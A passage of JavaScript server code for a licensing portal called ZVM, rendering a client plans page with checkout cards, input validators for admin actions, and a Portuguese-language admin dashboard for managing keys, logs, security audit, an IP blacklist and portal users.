          : '<button type="button" class="plan-btn '+(popular?'plan-btn-primary':'plan-btn-outline')+'" data-buy-plan="'+plan.id+'" data-checkout="'+escHtml(checkoutUrlForPortal(plan.checkoutUrl,user?.keyCode,user?.email,APP_SECRET))+'" data-plan-name="'+escHtml(plan.shortName)+'" data-devices="'+plan.maxUses+'" data-duration="'+plan.durationDays+'" data-price="'+price.whole+','+price.cents+'">'+(isCurrent?'Renovar este plano':'Escolher este plano')+'</button>';
    return `<article class="price-card${popular?' featured':''}${isCurrent?' current-plan':''}" aria-labelledby="client-plan-${plan.id}" data-plan-id="${plan.id}">
      <div class="client-plan-tags">${isCurrent?'<span class="price-suggested-tag current-plan-tag">Plano atual</span>':''}${popular?'<span class="price-badge">Mais popular</span>':''}${plan.consult?'<span class="price-badge">Sob consulta</span>':''}</div>
      <span class="price-icon" aria-hidden="true">${PLAN_ICONS[plan.id]||''}</span>
      <h2 class="price-tier" id="client-plan-${plan.id}">${escHtml(plan.shortName)}</h2>
      <p class="price-subtitle">${escHtml(identity.subtitle||'')}</p>
      <p class="price-devices">${plan.maxUses===1?'1 número':`Até ${plan.maxUses} números`} de WhatsApp</p>
      <div class="price-val">${plan.consult?'Sob consulta':`<sup>R$</sup>${price.whole}<span>,${price.cents}</span><sub>/mês</sub>`}</div>
      <p class="price-per${plan.maxUses>1?' price-per-strong':''}">${plan.consult?'Implantação empresarial personalizada':'R$ '+perDevice+' por número'}</p>
      <div class="price-divider"></div>
      <ul class="price-feats"><li><span class="chk">✓</span>Todos os recursos inclusos</li><li><span class="chk">✓</span>${plan.durationDays} dias de acesso</li><li><span class="chk">✓</span>Entrega automática por e-mail</li><li><span class="chk">✓</span>Renovação e troca pelo portal</li></ul>
      ${action}
    </article>`;
  }).join('');
  const needPicker=`<div class="need-picker" role="radiogroup" aria-labelledby="client-need-picker-label"><p class="need-picker-label" id="client-need-picker-label">Quantos números você precisa conectar?</p><div class="need-options">${NEED_OPTIONS.map(opt=>`<label class="need-opt"><input type="radio" name="need" value="${opt.planId}"><span>${opt.label}</span></label>`).join('')}</div></div>`;
  const modal=`<dialog class="checkout-dialog" aria-labelledby="checkout-title"><div class="dialog-inner"><div class="modal-icon" aria-hidden="true">↗</div><h2 id="checkout-title">Confirmar plano</h2><div class="modal-plan-summary"><div class="modal-plan-name" id="modal-plan-name">—</div><div class="modal-plan-meta" id="modal-plan-meta">—</div><div class="modal-plan-price" id="modal-plan-price">—</div></div><div class="modal-account"><span class="modal-account-label">Compra vinculada à conta</span><strong class="modal-email">${escHtml(user?.email||'')}</strong></div><p class="modal-hint">Use este mesmo e-mail na página de pagamento para que sua licença seja ativada ou renovada automaticamente.</p><div class="modal-actions"><button type="button" class="modal-cancel">Voltar</button><a class="modal-continue" href="#" target="_blank" rel="noopener noreferrer">Continuar para pagamento →</a></div></div></dialog>`;
  const body=`<div class="client-shell">${renderClientPortalRail('plans')}<main id="main-content" class="client-main client-plans-main" tabindex="-1">
    <div class="dash-topbar"><div class="dash-page-heading"><span>Minha ZVM</span><strong>Renovações e planos</strong></div><div class="dash-topbar-user">${renderClientAccountIdentity(user)}<a href="/cliente/logout" class="dash-logout">Sair da conta</a></div></div>
    <section class="client-plans-public-style"><header class="client-plans-public-head client-plan-intro"><span>Renove ou altere seu plano</span><h1>Seu acesso, suas escolhas.</h1><p>Compare os planos e gerencie sua licença sem perder o histórico da conta.</p></header>${renderPurchaseJourney()}${ZVM_SALES_PAUSED ? '<div class="purchase-note sales-paused-alert" role="status"><strong>Vendas e renovações temporariamente suspensas.</strong> Estamos realizando ajustes; sua licença atual não será modificada.</div>' : ''}${needPicker}${legacyRenewal}<section class="pricing-grid" aria-label="Planos ZVM">${cards}</section><p class="plans-footnote">Precisa de mais de 10 números? <a href="${ZVM_SUPPORT_URL}" target="_blank" rel="noopener noreferrer">Falar com suporte</a></p></section>
    ${ZVM_SALES_PAUSED ? '' : modal}<script src="/assets/zvm-plans.3d82262649b9.js" defer></script>
  </main></div>`;
  return renderPortalPage(body,'ZVM — Renovações e Planos','',_CSS_PLANS+_CSS_SALES_STATE+_CSS_PUBLIC_EXPERIENCE);
}

// ──────────── fim portal do cliente ────────────────────────────

function normalizeAdminCreateLabel(value) {
  if (value === undefined || value === null || value === '') return { ok: true, label: 'Cliente' };
  if (typeof value !== 'string') return { ok: false, error: 'invalid_label_type' };
  const label = value.trim().slice(0, 60);
  return { ok: true, label: label || 'Cliente' };
}

// R47.07: absolute validity changes, separate from the idempotent /renew endpoint.
function parseAdminValidityChange(body,nowMs=Date.now()){
  if(!body||typeof body!=='object'||Array.isArray(body))return {ok:false,error:'invalid_validity_mode'};
  if(body.mode==='never'){
    if(body.expiresAt!==undefined)return {ok:false,error:'invalid_validity_mode'};
    return {ok:true,mode:'never',expiresAt:null};
  }
  if(body.mode!=='date'||typeof body.expiresAt!=='string')return {ok:false,error:'invalid_validity_mode'};
  const raw=body.expiresAt;
  if(!/^\d{4}-\d{2}-\d{2}T\d{2}:\d{2}:\d{2}\.\d{3}Z$/.test(raw))return {ok:false,error:'invalid_validity_date'};
  const timestamp=Date.parse(raw);
  if(!Number.isFinite(timestamp)||new Date(timestamp).toISOString()!==raw||
     timestamp<nowMs+60000||timestamp>Date.parse('2100-01-01T00:00:00.000Z'))return {ok:false,error:'invalid_validity_date'};
  return {ok:true,mode:'date',expiresAt:raw};
}

function parseAdminBatchDeleteCodes(body) {
  const rawCodes = Array.isArray(body?.codes) ? body.codes : [];
  if (!rawCodes.length) return { ok: false, error: 'nenhum código enviado', codes: [] };
  if (rawCodes.length > 200) return { ok: false, error: 'too_many_keys', codes: [] };
  // Não truncar/sanitizar silenciosamente: isso poderia excluir outra chave.
  if (!rawCodes.every(code => typeof code === 'string' && /^[a-z0-9_-]{1,64}$/i.test(code))) {
    return { ok: false, error: 'invalid_key_codes', codes: [] };
  }
  return { ok: true, codes: [...new Set(rawCodes)] };
}

// Dashboard administrativo do banco canônico ZVM.
function renderAdminDashboard(opts = {}) {
  const snapshot = opts.keysSnapshot || keys;
  const stats = getKeyStats(snapshot);
  const _keysHtml = opts.keysSnapshot ? buildKeysHtml(snapshot) : getKeysHtmlCached();
  const _logsHtml = buildLogsHtml();
  const initialPortalUsers = Array.isArray(opts.portalUsers) ? opts.portalUsers : [];
  const portalUserCount = Number(opts.portalUserCount ?? initialPortalUsers.length ?? 0);
  const initialPortalUsersJson = JSON.stringify(initialPortalUsers)
    .replace(/</g,'\\u003c').replace(/>/g,'\\u003e').replace(/&/g,'\\u0026')
    .replace(/\u2028/g,'\\u2028').replace(/\u2029/g,'\\u2029');
  const initialPortalUsersRows = initialPortalUsers.length ? initialPortalUsers.map(u => {
    const created = u.createdAt ? new Date(u.createdAt).toLocaleString('pt-BR',{timeZone:'America/Sao_Paulo',day:'2-digit',month:'2-digit',year:'numeric',hour:'2-digit',minute:'2-digit'}) : '-';
    const lastLogin = u.lastLogin ? new Date(u.lastLogin).toLocaleString('pt-BR',{timeZone:'America/Sao_Paulo',day:'2-digit',month:'2-digit',year:'numeric',hour:'2-digit',minute:'2-digit'}) : '-';
    const name = escHtml(u.name || u.displayName || '-');
    const email = escHtml(u._id || u.email || '-');
    const phone = u.phone ? `<span style="font-family:var(--mono);font-size:13px">${escHtml(u.phone)}</span>` : '<span style="color:var(--tx3)">—</span>';
    const key = u.keyCode ? `<span class="kc" style="font-size:12px">${escHtml(u.keyCode)}</span>` : '<span style="color:var(--tx3)">—</span>';
    const plan = u.plan ? `<span style="color:var(--g);font-weight:700;font-size:12px">${escHtml(String(u.plan).toUpperCase())}</span>` : '<span style="color:var(--tx3)">—</span>';
    const status = u.banned ? '<span class="badge off">Banido</span>' : u.verified === false ? '<span class="badge" style="background:#ffa04020;color:var(--orange);border:1px solid #ffa04040">Pendente</span>' : '<span class="badge on">Ativo</span>';
    return `<tr><td style="font-weight:600">${name}</td><td style="font-family:var(--mono);font-size:12px;color:var(--tx2)">${email}</td><td>${phone}</td><td>${key}</td><td>${plan}</td><td style="font-size:12px;color:var(--tx3)">${escHtml(created)}</td><td style="font-size:12px;color:var(--tx3)">${escHtml(lastLogin)}</td><td>${status}</td></tr>`;
  }).join('') : '<tr><td colspan="8" class="empty">Nenhum usuário cadastrado.</td></tr>';
  const { expiredKeys: expiredCount, warnKeys: expiringSoon } = stats;
  const _adminBrand = renderStandaloneBrand('compact');

  return `<!DOCTYPE html>
<html lang="pt-BR" data-admin-root="${escHtml(R_ADMIN)}">
<head>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>ZVM — Administração</title>
<link rel="icon" type="image/svg+xml" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 32 32'%3E%3Crect width='32' height='32' rx='8' fill='%23080810'/%3E%3Ctext x='50%25' y='54%25' dominant-baseline='middle' text-anchor='middle' font-family='monospace' font-weight='700' font-size='14' fill='%2300ff87'%3EZVM%3C/text%3E%3C/svg%3E">
<link rel="stylesheet" href="/assets/zvm-admin-dashboard.5c649db2edf7.css">
<link rel="stylesheet" href="/assets/zvm-r46-system.aa366d924866.css">
<link rel="stylesheet" href="/assets/zvm-action-hub.07aa17b87c3e.css">
<link rel="stylesheet" href="/assets/zvm-console-design.44762cb103f8.css">
<link rel="stylesheet" href="/assets/zvm-owner-site.42d17a62234b.css">
<link rel="stylesheet" href="/assets/zvm-admin-dashboard.cd85ea19cc73.css">
</head>
<body class="zvm-admin-r6">
<a class="zvm-skip-link" href="#zvm-admin-main">Ir para o conteúdo</a>
<header>
  <div class="logo">
    ${_adminBrand}
    <span class="logo-ver">Administração</span>
  </div>
  <div class="hright">
    <span class="hdr-meta" id="last-refresh" role="status" aria-live="polite">—</span>
    <span class="hdr-meta" id="hdr-users-count" title="Usuários no Portal" style="display:none;background:var(--g-bg);color:var(--g);border:1px solid var(--g-brd);border-radius:var(--r-sm);padding:2px 8px;font-weight:700">👥 <span id="hdr-users-num">0</span></span>
    <button type="button" id="hdr-suspect-badge" title="Filtrar chaves suspeitas" style="background:#ff475718;color:#ff4757;border:1px solid #ff475730;border-radius:var(--r-sm);padding:2px 8px;font:inherit;font-weight:700;font-size:11px;min-height:32px;cursor:pointer" onclick="document.getElementById('filter-status').value='suspect';switchTab('keys');filterKeys()">⚠ <span id="hdr-suspect-num">0</span> suspeita(s)</button>
    <span id="hdr-session-warn" style="display:none;background:#f0b42912;color:var(--orange);border:1px solid var(--org-brd);border-radius:var(--r-sm);padding:2px 8px;font-size:11px">⏱ Sessão expira em <span id="hdr-session-min">—</span> min</span>
    <button class="btn bw" onclick="doRefresh(true)">↻ Atualizar</button>
    ${renderZvmActionHub('admin')}
  </div>
</header>
<div class="admin-wrap">
<nav class="rsidebar" id="rsidebar" aria-label="Navegação administrativa">
  <div class="rsb-title">Menu</div>
  <button class="rtab active" data-tab="keys" onclick="switchTab('keys')"><span class="rtab-icon">🔑</span><span class="rtab-label">Chaves</span></button>
  <button class="rtab" data-tab="logs" onclick="switchTab('logs')"><span class="rtab-icon">📋</span><span class="rtab-label">Logs</span></button>
  <button class="rtab" data-tab="audit" onclick="switchTab('audit')"><span class="rtab-icon">🛡</span><span class="rtab-label">Auditoria</span></button>
  <button class="rtab" data-tab="users" onclick="switchTab('users')"><span class="rtab-icon">👥</span><span class="rtab-label">Usuários</span></button>
  <button class="rtab" data-tab="security" onclick="switchTab('security')"><span class="rtab-icon">🔒</span><span class="rtab-label">Segurança</span></button>
</nav>
<main class="admin-content" id="zvm-admin-main" tabindex="-1">

  <section class="admin-overview" aria-labelledby="admin-overview-title">
    <div class="zvm-overview-main">
      <span class="admin-overview-kicker">ZVM · Administração</span>
      <h1 id="admin-overview-title">Visão geral da operação</h1>
      <p>Chaves, clientes e auditoria em um único espaço, com a identidade do portal ZVM.</p>
      <div class="admin-overview-actions">
        <button type="button" class="primary" onclick="switchTab('keys')">Gerenciar licenças</button>
        <button type="button" onclick="switchTab('users')">Ver clientes</button>
        <button type="button" onclick="switchTab('security')">Segurança</button>
        <button type="button" onclick="switchTab('audit')">Auditoria</button>
      </div>
    </div>
    <aside class="zvm-overview-help" aria-label="Orientações operacionais">
      <strong>Operação com confiança</strong>
      <p>As métricas e os registros são consultados no servidor. Confira a indicação de atualização antes de operações importantes.</p>
      <div class="zvm-overview-step"><span class="zvm-step-number">01</span><span>Encontre a licença com busca, filtros e indicadores.</span></div>
      <div class="zvm-overview-step"><span class="zvm-step-number">02</span><span>Confirme as alterações realizadas e consulte o histórico quando necessário.</span></div>
    </aside>
  </section>


  <div class="alert-strip" id="urgent-alert" style="${(expiredCount>0||expiringSoon>0)?'':'display:none'}">
    <span>⚠</span>
    <span id="urgent-alert-text">${expiredCount>0?`<strong>${expiredCount} expirada(s)</strong>`:''}${expiredCount>0&&expiringSoon>0?' · ':''}${expiringSoon>0?`<strong>${expiringSoon} expirando em ${EXPIRY_WARN_HOURS}h</strong>`:''}</span>
  </div>

  <div class="stats">
    <div class="sc"><div class="sc-icon">🔑</div><div class="n" id="s-total">${stats.totalKeys}</div><div class="l">Total</div></div>
    <div class="sc" role="button" tabindex="0" onkeydown="if(event.key==='Enter'||event.key===' '){event.preventDefault();this.click()}" style="cursor:pointer" onclick="document.getElementById('filter-status').value='ativo';filterKeys()" title="Filtrar ativas"><div class="sc-icon">✅</div><div class="n" id="s-active">${stats.activeKeys}</div><div class="l">Ativas</div></div>
    <div class="sc" role="button" tabindex="0" onkeydown="if(event.key==='Enter'||event.key===' '){event.preventDefault();this.click()}" style="cursor:pointer" onclick="document.getElementById('filter-status').value='bloqueado';filterKeys()" title="Filtrar bloqueadas"><div class="sc-icon">🔒</div><div class="n" id="s-blocked">${stats.blockedKeys}</div><div class="l">Bloqueadas</div></div>
    <div class="sc" role="button" tabindex="0" onkeydown="if(event.key==='Enter'||event.key===' '){event.preventDefault();this.click()}" style="cursor:pointer" onclick="document.getElementById('filter-status').value='aguardando';filterKeys()" title="Filtrar aguardando 1º uso"><div class="sc-icon">⏱</div><div class="n" id="s-deferred">${stats.deferredKeys}</div><div class="l">Aguardando 1º uso</div></div>
    <div class="sc${expiredCount>0?' expired-card':''}" role="button" tabindex="0" onkeydown="if(event.key==='Enter'||event.key===' '){event.preventDefault();this.click()}" style="cursor:pointer" onclick="document.getElementById('filter-status').value='expirada';filterKeys()" title="Filtrar expiradas"><div class="sc-icon">⛔</div><div class="n" id="s-expired">${expiredCount}</div><div class="l">Expiradas</div></div>
    <div class="sc${expiringSoon>0?' warn-card':''}" role="button" tabindex="0" onkeydown="if(event.key==='Enter'||event.key===' '){event.preventDefault();this.click()}" style="cursor:pointer" onclick="document.getElementById('filter-status').value='expirando';filterKeys()" title="Filtrar expirando em breve"><div class="sc-icon">⏰</div><div class="n" id="s-warn">${expiringSoon}</div><div class="l">Expirando (${EXPIRY_WARN_HOURS}h)</div></div>
    <div class="sc" role="button" tabindex="0" onkeydown="if(event.key==='Enter'||event.key===' '){event.preventDefault();this.click()}" style="cursor:pointer" onclick="document.getElementById('filter-status').value='suspect';filterKeys()" title="Filtrar suspeitas"><div class="sc-icon">⚠️</div><div class="n" id="s-suspect" style="${stats.suspectKeys>0?'color:var(--red)':''}">${stats.suspectKeys}</div><div class="l">Suspeitas</div></div>
    <div class="sc"><div class="sc-icon">📋</div><div class="n" id="s-logs">${stats.totalLogs}</div><div class="l">Logs</div></div>
  </div>

  <p class="admin-key-action-guide" id="admin-key-guide">Selecione um indicador para filtrar as licenças. Confira o resultado na tabela antes de bloquear, renovar ou alterar uma chave.</p>

  <!-- ── PAINEL CHAVES ── -->
  <div class="sec-panel active" data-panel="keys">
  <div class="sec">
    <div class="sh">
      <div class="st"><span class="st-accent">🔑</span> Chaves de Acesso</div>
      <div class="gen-form">
        <div class="fi-name"><input type="text" id="nlabel" placeholder="Nome do cliente"></div>
        <div class="fi-sep"></div>
        <div class="fi-group">
          <div class="fi-col"><span class="fi-lbl">Dias</span><input type="number" id="ndays" class="fi-num" placeholder="0" min="0"></div>
          <div class="fi-col"><span class="fi-lbl">Horas</span><input type="number" id="nhours" class="fi-num" placeholder="0" min="0"></div>
          <div class="fi-col"><span class="fi-lbl">Min</span><input type="number" id="nmins" class="fi-num" placeholder="0" min="0"></div>
        </div>
        <div class="fi-sep"></div>
        <div class="fi-col"><span class="fi-lbl">Usos</span><input type="number" id="nuses" class="fi-num" placeholder="3" min="-1" style="width:56px"></div>
        <div class="fi-col" style="justify-content:flex-end;padding-bottom:1px"><label style="display:flex;align-items:center;gap:5px;font-size:11px;color:var(--tx2);white-space:nowrap;cursor:pointer"><input type="checkbox" id="ndeferred" style="accent-color:var(--g);width:13px;height:13px">⏱ Ativar ao 1º uso</label></div>
        <input type="number" id="batch-qty" min="1" max="50" value="1" style="width:58px;padding:6px 8px;border:1px solid var(--brd);border-radius:6px;background:var(--bg);color:var(--tx);font-size:13px" title="Quantidade de chaves a gerar">
<button class="btn bp" id="admin-generate-key-btn" onclick="generateKey()">+ Gerar Chave(s)</button>
      </div>
    </div>
    <div id="admin-create-status" role="status" aria-live="polite" hidden style="display:none;padding:10px 14px;border:1px solid var(--org-brd);border-radius:10px;background:#f0b42912;color:var(--orange);font-size:13px;margin:10px 0"></div>
    <div class="search-bar">
      <input type="text" id="search-input" placeholder="Buscar por nome, chave, telefone ou IP…" oninput="filterKeys()" autocomplete="off" spellcheck="false">
      <select id="filter-status" onchange="filterKeys()">
        <option value="">Todos os status</option>
        <option value="ativo">Ativas</option>
        <option value="expirando">Expirando</option>
        <option value="expirada">Expiradas</option>
        <option value="bloqueado">Bloqueadas</option>
        <option value="aguardando">Aguardando 1º uso</option>
        <option value="suspect">⚠ Suspeitas</option>
      </select>
      <select id="filter-plan" onchange="filterKeys()" style="min-width:120px">
        <option value="">Todos os planos</option>
        <option value="pro">Pro</option>
        <option value="basic">Básico</option>
        <option value="free">Free</option>
      </select>
      <button class="btn br" id="btn-delete-batch" style="display:none" onclick="deleteBatchKeys()">🗑 Excluir Selecionadas (<span id="batch-count">0</span>)</button>
    </div>
    <div class="filter-count" id="keys-filter-count"></div>
    <div class="ov">
      <table class="keys-table" aria-label="Licenças ZVM">
        <colgroup>
          <col style="width:11%">
          <col style="width:8%">
          <col style="width:6%">
          <col style="width:9%">
          <col style="width:4%">
          <col style="width:8%">
          <col style="width:6%">
          <col style="width:7%">
          <col style="width:7%">
          <col style="width:5%">
          <col style="width:9%">
          <col style="width:16%">
        </colgroup>
        <thead><tr>
          <th onclick="sortKeys('code')"><span style="display:flex;align-items:center;gap:6px"><input type="checkbox" id="master-cb" onchange="toggleAllCheckboxes(this.checked)" style="cursor:pointer;width:13px;height:13px;flex-shrink:0">CHAVE</span></th>
          <th onclick="sortKeys('label')" id="th-label">Cliente</th>
          <th onclick="sortKeys('status')" id="th-status">Status</th>
          <th onclick="sortKeys('validity')" id="th-validity">Validade</th>
          <th onclick="sortKeys('uses')" id="th-uses">Usos</th>
          <th onclick="sortKeys('phone')" id="th-phone">Telefone</th>
          <th>Último IP</th>
          <th onclick="sortKeys('lastused')" id="th-lastused">Último Acesso</th>
          <th onclick="sortKeys('created')" id="th-created">Criado em</th>
          <th>Origem</th>
          <th>Nota</th>
          <th style="cursor:default">Ações</th>
        </tr></thead>
        <tbody id="kb">${_keysHtml}</tbody>
      </table>
    </div>
  </div>
  </div>

  <!-- ── PAINEL LOGS ── -->
  <div class="sec-panel" data-panel="logs">
  <div class="sec">
    <div class="sh">
      <div class="st"><span class="st-accent">📋</span> Log de Acessos <span style="font-size:11px;color:var(--tx3);font-weight:400;margin-left:4px">retenção ${LOG_RETENTION_DAYS}d (LGPD)</span></div>
      <div style="display:flex;gap:8px;align-items:center;flex-wrap:wrap">
        <input type="date" id="logDate" style="padding:5px 8px;background:var(--bg);border:1px solid var(--brd);border-radius:var(--r-sm);color:var(--tx);font-size:12px;outline:none;transition:border-color .18s" onchange="filterLog()">
        <input type="text" id="logSearch" placeholder="Filtrar por chave ou IP…" style="padding:5px 8px;background:var(--bg);border:1px solid var(--brd);border-radius:var(--r-sm);color:var(--tx);font-size:12px;outline:none;width:170px;transition:border-color .18s" oninput="filterLog()">
        <button class="btn bw" onclick="clearFilters()">✕ Limpar</button>
        <button class="btn bw" onclick="doRefresh()">↻ Atualizar</button>
        <button class="btn br" onclick="clearLog()">🗑 Limpar Log</button>
      </div>
    </div>
    <div class="ov">
      <table>
        <thead><tr><th>Horário</th><th>Chave</th><th>Cliente</th><th>Telefone</th><th>IP</th><th>Ação</th></tr></thead>
        <tbody id="lb">${_logsHtml}</tbody>
      </table>
    </div>
  </div>
  </div>

  <!-- ── PAINEL AUDITORIA ── -->
  <div class="sec-panel" data-panel="audit">
  <div class="sec" id="pentest-sec">
    <div class="sh">
      <div>
        <div class="st"><span class="st-accent">🛡</span> Auditoria de Segurança</div>
        <div style="font-size:11px;color:var(--tx3);margin-top:2px">Config hardening · fuzzing NoSQL · headers · TLS · telemetria · CORS/leakage · cookies · batch guard</div>
      </div>
      <button class="btn bw" id="pentest-btn" onclick="runPentest()">▶ Executar Varredura</button>
    </div>
    <div class="ov" style="max-height:none;overflow-y:visible">
      <table>
        <thead><tr>
          <th style="width:42%">Controle</th>
          <th style="width:12%;text-align:center">Status</th>
          <th>Detalhe</th>
        </tr></thead>
        <tbody id="pentest-tb">
          <tr><td class="empty" colspan="3">Clique em <strong>▶ Executar Varredura</strong> para iniciar a auditoria de segurança.</td></tr>
        </tbody>
      </table>
    </div>
  </div>

  <div class="sec" style="margin-top:12px">
    <div class="sh">
      <div>
        <div class="st"><span class="st-accent">🚨</span> Alertas de Segurança</div>
        <div style="font-size:11px;color:var(--tx3);margin-top:2px">Logins falhos · Rate limit · Payloads suspeitos · Webhooks inválidos</div>
      </div>
      <div style="display:flex;gap:8px">
        <a href="${R_ADMIN}/api/audit-logs/csv" class="btn bw" style="font-size:11px;padding:4px 10px;text-decoration:none" download>⬇ Exportar Auditoria CSV</a>
        <button class="btn br" style="font-size:11px;padding:4px 10px" onclick="clearSecurityAlerts()">🗑 Limpar Logs</button>
      </div>
    </div>
    <div class="ov">
      <table>
        <thead><tr>
          <th style="width:16%">Horário (BRT)</th>
          <th style="width:18%">Categoria</th>
          <th>Detalhe</th>
          <th style="width:14%">IP</th>
        </tr></thead>
        <tbody id="sec-alerts-tb">
          <tr><td colspan="4" class="empty">Execute a varredura para carregar alertas.</td></tr>
        </tbody>
      </table>
    </div>
  </div>
  </div>

  <!-- ── PAINEL SEGURANÇA ── -->
  <div class="sec-panel" data-panel="security">
  <div class="sec">
    <div class="sh">
      <div>
        <div class="st"><span class="st-accent">🔒</span> Blacklist de IPs</div>
        <div style="font-size:11px;color:var(--tx3);margin-top:2px">IPs bloqueados permanentemente em todas as requisições</div>
      </div>
      <div style="display:flex;gap:6px;align-items:center">
        <input type="text" id="ip-bl-input" placeholder="Ex: 1.2.3.4" style="padding:5px 9px;background:var(--bg);border:1px solid var(--brd);border-radius:var(--r-sm);color:var(--tx);font-size:12px;outline:none;width:155px" onkeydown="if(event.key==='Enter')addToBlacklist()">
        <button class="btn bp" style="font-size:12px;padding:5px 12px" onclick="addToBlacklist()">+ Bloquear IP</button>
      </div>
    </div>
    <div class="ov">
      <table>
        <thead><tr><th>IP Bloqueado</th><th style="width:120px;text-align:center">Ação</th></tr></thead>
        <tbody id="ip-bl-tb"><tr><td colspan="2" class="empty">Nenhum IP bloqueado</td></tr></tbody>
      </table>
    </div>
  </div>

  </div>

  <!-- ── PAINEL USUÁRIOS ── -->
  <div class="sec-panel" data-panel="users">
  <div class="sec">
    <div class="sh">
      <div>
        <div class="st"><span class="st-accent">👥</span> Usuários do Portal <span id="users-panel-badge" style="display:${portalUserCount>0?'inline':'none'};font-size:11px;font-weight:700;color:var(--g);background:var(--g-bg);border:1px solid var(--g-brd);border-radius:99px;padding:1px 9px;margin-left:6px;vertical-align:middle">${portalUserCount}</span></div>
        <div style="font-size:11px;color:var(--tx3);margin-top:2px">Todos os usuários registrados no Portal do Cliente</div>
      </div>
      <div style="display:flex;gap:8px;align-items:center">
        <input type="text" id="users-search" placeholder="Buscar por nome, e-mail ou chave…" style="padding:5px 10px;background:var(--bg);border:1px solid var(--brd);border-radius:var(--r-sm);color:var(--tx);font-size:12px;outline:none;width:220px" oninput="filterUsers()">
        <button class="btn bw" onclick="loadUsers(true)">↻ Atualizar</button>
      </div>
    </div>
    <div class="ov">
      <table id="users-table">
        <thead><tr>
          <th>Nome</th>
          <th>E-mail</th>
          <th>WhatsApp</th>
          <th>Chave Vinculada</th>
          <th>Plano</th>
          <th>Cadastrado em</th>
          <th>Último Login</th>
          <th>Status</th>
        </tr></thead>
        <tbody id="users-tb">${initialPortalUsersRows}</tbody>
      </table>
    </div>
  </div>
  </div>

</main><!-- /admin-content -->
</div><!-- /admin-wrap -->

<!-- ── Modals ── -->
<div class="modal-bg" id="renewModal"><div class="modal">
  <h3>Gerenciar validade · <span id="renewKeyLabel" style="color:var(--g)"></span></h3>
  <input type="hidden" id="renewKeyCode">
  <label for="renewMode" class="modal-lbl">O que deseja fazer?</label>
  <select id="renewMode" class="key-validity-mode" onchange="applyRenewMode()"><option value="add">Adicionar tempo</option><option value="remove">Remover tempo</option><option value="date">Definir data de expiração</option><option value="never">Sem expiração (ilimitado)</option></select>
  <div id="renewDurationFields" class="key-validity-duration" style="display:flex;gap:10px;margin-bottom:12px">
    <div style="flex:1;text-align:center"><label for="renewDays" class="modal-lbl">Dias</label><input type="number" id="renewDays" placeholder="0" style="width:100%;padding:7px;text-align:center"></div>
    <div style="flex:1;text-align:center"><label for="renewHours" class="modal-lbl">Horas</label><input type="number" id="renewHours" placeholder="0" style="width:100%;padding:7px;text-align:center"></div>
    <div style="flex:1;text-align:center"><label for="renewMins" class="modal-lbl">Min</label><input type="number" id="renewMins" placeholder="0" style="width:100%;padding:7px;text-align:center"></div>
  </div>
  <div id="renewExactFields" class="key-validity-exact" hidden><label for="renewExactDate" class="modal-lbl">Expira em (data e hora locais)</label><input type="datetime-local" id="renewExactDate"><small class="key-modal-help">Permite reduzir a validade. Escolha uma data futura.</small></div>
  <p id="renewNeverInfo" class="key-validity-never key-modal-help" hidden>Remove a expiração e o prazo de primeiro uso. As outras restrições permanecem.</p>
  <div id="renewPreview" class="key-renew-preview" role="status" aria-live="polite">Informe um período para calcular a nova validade.</div>
  <div style="font-size:12px;color:var(--tx3);margin-bottom:12px" id="renewCurrentExpiry"></div>
  <div class="modal-actions">
    <button class="btn modal-cancel" onclick="closeRenew()">Cancelar</button>
    <button class="btn bp" id="renewSaveButton" onclick="saveRenew()">Adicionar Tempo</button>
  </div>
</div></div>

<div class="modal-bg" id="editUsesModal"><div class="modal">
  <h3>👥 Limite de Dispositivos — <span id="editUsesLabel" style="color:var(--g)"></span></h3>
  <input type="hidden" id="editUsesCode">
  <div style="margin-bottom:14px">
    <label for="editUsesValue" class="modal-lbl">Máx. números simultâneos</label>
    <input type="number" id="editUsesValue" min="1" max="10000" step="1" style="width:100%;padding:9px;font-size:15px;text-align:center;margin-top:6px">
    <label class="key-option-row" for="editUsesUnlimited"><input type="checkbox" id="editUsesUnlimited" onchange="applyUsesUnlimited()"> Sem limite de dispositivos (∞)</label>
    <small id="editUsesLinked" class="key-modal-help">Os números já vinculados permanecem registrados.</small>
  </div>
  <div class="modal-actions">
    <button class="btn modal-cancel" onclick="closeEditUses()">Cancelar</button>
    <button class="btn bp" onclick="saveEditUses()">Salvar</button>
  </div>
</div></div>

<div class="modal-bg" id="renameModal"><div class="modal">
  <h3>✏ Renomear Chave</h3>
  <input type="hidden" id="renameCode">
  <div style="margin-bottom:14px">
    <div class="modal-lbl">Novo nome do cliente</div>
    <input type="text" id="renameValue" maxlength="60" style="width:100%;padding:8px 10px;margin-top:6px">
  </div>
  <div class="modal-actions">
    <button class="btn modal-cancel" onclick="closeRename()">Cancelar</button>
    <button class="btn bp" onclick="saveRename()">Salvar</button>
  </div>
</div></div>

<div class="modal-bg" id="phonesModal"><div class="modal">
  <h3>📱 Números — <span id="phonesLabel" style="color:var(--g)"></span></h3>
  <div id="phonesList" style="margin-bottom:14px;max-height:220px;overflow-y:auto;min-height:40px"></div>
  <div class="modal-actions">
    <button class="btn modal-cancel" onclick="closePhones()">Fechar</button>
    <button class="btn bd" id="removeAllBtn" onclick="removeAllPhones()">Remover Todos</button>
  </div>
</div></div>

<div class="modal-bg" id="noteModal"><div class="modal">
  <h3>📝 Nota — <span id="noteKeyLabel" style="color:var(--g)"></span></h3>
  <input type="hidden" id="noteKeyCode">
  <textarea id="noteText" placeholder="Ex: Pagou até março, trial, VIP…"></textarea>
  <div class="modal-actions">
    <button class="btn modal-cancel" onclick="closeNote()">Cancelar</button>
    <button class="btn bp" onclick="saveNote()">Salvar Nota</button>
  </div>
</div></div>

<div class="toast" id="toast" role="status" aria-live="polite"></div>

<template id="zvm-admin-users-data">${initialPortalUsersJson}</template>
<script src="/assets/zvm-admin-dashboard.bc01cf565fa7.js" defer></script>
</body></html>`;
}

function renderAdminLogin(error = '') {
  return `<!DOCTYPE html><html lang="pt-BR"><head>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>ZVM Admin</title><link rel="icon" type="image/svg+xml" href="${_FAV}">${_GFONTS}
${_CSS_SHARED}${_CSS_STANDALONE}${_CSS_AUTH}${_CSS_PRIVILEGED_AUTH}${_CSS_SYSTEM}</head><body class="zvm-auth-immersive zvm-auth-premium">
<main class="auth-shell">
  <section class="auth-promo" aria-hidden="true"><div class="auth-promo-inner">
    <div class="admin-auth-tag">Área administrativa</div>
    <h1>Controle a ZVM com <em>clareza e segurança.</em></h1>
